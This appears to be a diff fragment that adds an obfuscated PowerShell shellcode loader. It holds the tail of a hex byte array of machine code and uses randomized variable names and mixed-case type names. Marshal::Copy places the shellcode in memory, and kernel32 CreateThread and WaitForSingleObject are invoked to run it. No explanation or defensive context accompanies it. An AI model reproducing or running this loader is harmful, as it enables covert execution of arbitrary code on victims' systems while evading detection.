0x35,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5
+[sYStEm.rUNtIMe.INtErOpsERviceS.maRSHAL]::Copy($af6u7xj3ZvwXAZRaFSdpxBFcVm6rou4Rc0ZVt97, 0, $b6RMQiOpjkUoY8DmDD0niKCAh3z5gHcsc0QDd22wtCTPdfoyAHQ8Su7WLAmUwTWT28vhkzaGNVU038OZNeYeNzW7Tz2ihmhYP88zi0XaEYL349EeIA6skdmEJTP3TlaCuRNNZdtsP3sAY1hpjCtUmIpZOibXnnZcGfcPY95Mi48n1FxNpPI4YS45Kysu25X13sOwZ8QOw7Pq6ODFZAlC0KDx8dLyCra49qOlSlaZJI2sTZDW0fAs, $af6u7xj3ZvwXAZRaFSdpxBFcVm6rou4Rc0ZVt97.length)
+
+$YxZxVT4RHnCG9HfiTlKMfgYmHX8ZuGQoGuH5ArTwxrthtCu37lZY8Nuf8xKX51va2eKiZMjwFUbiwhPVFBKtvxeJQ8L4S74dXOT0d8hJQjqp5BFa5X3p6WouiersEgjfjpXbjWLAABgqK4GTpC9SSL417JLGtSJwTQ5C2ox67gbjKv4kO2TeL4rFzwKWljveiJ7Uj5USyupDHON6JFzaJY1eSGFT3zVq33cdbLrxOAWyT0IJLhp70MkTH7rQOsnG7LpHb3Pj0d1hg7jZqPR2T5GgqNs18tmeqmwA5qwZaGyrDm6zJCRrv9oIveI9nb5StovOK84SYHeBEXkolMIsHpJNS3VvqFD2XHLI4Xg2HWne5MA0CDapq9p4CmHL4OaVG2MS4MD6NvzrDVgf428wA8zWwi3pm4vQ1LNCfwocYmcdCzJk5IZ9tE88uqxc2GeiFuefh4Ne0zBwBIWFQaN4ZFsAaxuwGZsLZCtoOoUQxOFRvBEB05d0i6a42zki7o0qPaU7jGb3OmUpn2kndEQnTjk0bjYfhtCXzYhlQi2szzo1VJugT4k2esKmaUDgSk69NUa4yRfoCubTiVV43HliAL49fX5FlqxTXT06Wqeux4KGlvPUZFiAxAJ46RRh6Yk595xhLEi2YPh70hXUufI4UIVkK42cwNdzHGFaWNwq1qjJ8sUHlWoYNcUJwPp1bh5lqPUe6UrXoE3tuFBjwZGareZkRqm9SbezTV9YrXwxcMGV9LvoEMzQ8JULH = [sYStEm.rUNtIMe.INtErOpsERviceS.maRSHAL]::GetDelegateForFunctionPointer((BNPsFQKzpqNEqKXGyptFfqdLkbIkPMluhhjPacshq kernel32.dll CreateThread), (SnbfjOIKsIhsHQJirdzeJlHIUafJbqhZOjEBqbdmb @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $b6RMQiOpjkUoY8DmDD0niKCAh3z5gHcsc0QDd22wtCTPdfoyAHQ8Su7WLAmUwTWT28vhkzaGNVU038OZNeYeNzW7Tz2ihmhYP88zi0XaEYL349EeIA6skdmEJTP3TlaCuRNNZdtsP3sAY1hpjCtUmIpZOibXnnZcGfcPY95Mi48n1FxNpPI4YS45Kysu25X13sOwZ8QOw7Pq6ODFZAlC0KDx8dLyCra49qOlSlaZJI2sTZDW0fAs, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+[sYStEm.rUNtIMe.INtErOpsERviceS.maRSHAL]::GetDelegateForFunctionPointer((BNPsFQKzpqNEqKXGyptFfqdLkbIkPMluhhjPacshq kernel32.dll WaitForSingleObject), (SnbfjOIKsIhsHQJirdzeJlHIUafJbqhZOjEBqbdmb @([IntPtr], [Int32]) ([Int]))).Invoke($YxZxVT4RHnCG9HfiTlKMfgYmHX8ZuGQoGuH5ArTwxrthtCu37lZY8Nuf8xKX51va2eKiZMjwFUbiwhPVFBKtvxeJQ8L4S74dXOT0d8hJQjqp5BFa5X3p6WouiersEgjfjpXbjWLAABgqK4GTpC9SSL417JLGtSJwTQ5C2ox67gbjKv4kO2TeL4rFzwKWljveiJ7Uj5USyupDHON6JFzaJY1eSGFT3zVq33cdbLrxOAWyT0IJLhp70MkTH7rQOsnG7LpHb3Pj0d1hg7jZqPR2T5GgqNs18tmeqmwA5qwZaGyrDm6zJCRrv9oIveI9nb5StovOK84SYHeBEXkolMIsHpJNS3VvqFD2XHLI4Xg2HWne5MA0CDapq9p4CmHL4OaVG2MS4MD6NvzrDVgf428wA8zWwi3pm4vQ1LNCfwocYmcdCzJk5IZ9tE88uqxc2GeiFuefh4Ne0zBwBIWFQaN4ZFsAaxuwGZsLZCtoOoUQxOFRvBEB05d0i6a42zki7o0qPaU7jGb3OmUpn2kndEQnTjk0bjYfhtCXzYhlQi2szzo1VJugT4k2esKmaUDgSk69NUa4yRfoCubTiVV43HliAL49fX5FlqxTXT06Wqeux4KGlvPUZFiAxAJ46RRh6Yk595xhLEi2YPh70hXUufI4UIVkK42cwNdzHGFaWNwq1qjJ8sUHlWoYNcUJwPp1bh5lqPUe6UrXoE3tuFBjwZGareZkRqm9SbezTV9YrXwxcMGV9LvoEMzQ8JULH, 0xFFFFFFFF)
